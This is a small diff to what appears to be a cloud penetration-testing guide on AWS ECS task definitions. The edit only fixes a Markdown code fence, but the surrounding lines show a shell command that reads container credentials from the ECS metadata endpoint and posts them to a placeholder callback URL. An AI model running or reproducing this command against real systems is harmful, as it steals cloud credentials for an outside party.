@@ -2245,8 +2245,7 @@ aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_t
 
 ```bash
 /bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json {{CALLBACK URL}} \
-````
-
+```
 <p align="center">
   <img src="/images/cloud/task_template1.png">
 </p>
